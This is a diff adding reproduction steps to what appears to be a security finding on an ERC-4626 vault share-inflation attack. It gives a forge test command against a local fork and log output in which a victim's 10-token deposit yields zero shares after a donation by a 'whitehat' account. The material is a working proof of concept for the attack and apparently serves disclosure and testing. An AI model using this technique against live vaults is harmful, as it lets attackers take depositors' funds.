@@ -91,3 +91,31 @@ A test on foundry was created replicating the full situation, where the victim g
         assertEq(vaultBalanceAfterDeposit, inflationAmount + victimDeposit + 1);
     }
 ```
+
+It can be run by going into simulations and running 
+
+`forge test --match-path test/01_ERC_4626.sol --via-ir --fork-url  http://127.0.0.1:8599 -vvv `
+
+```shell
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/01_ERC_4626.sol:VaultTest
+[PASS] test() (gas: 158259)
+Logs:
+  vault balance start 0
+  victim balance start 100000000000000000000
+  whitehat balance start 100000000000000000000
+  deposit
+  vault balance after transfer 10000000000000000001
+  vault total supply after transfer 1
+  victim deposit
+  deposit
+  victim balance after deposit 90000000000000000000
+  vault balance after deposit 20000000000000000001
+  vault total supply after deposit 1
+  victim shares 0
+  whitehat shares 1
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.88ms (2.40ms CPU time)
+```
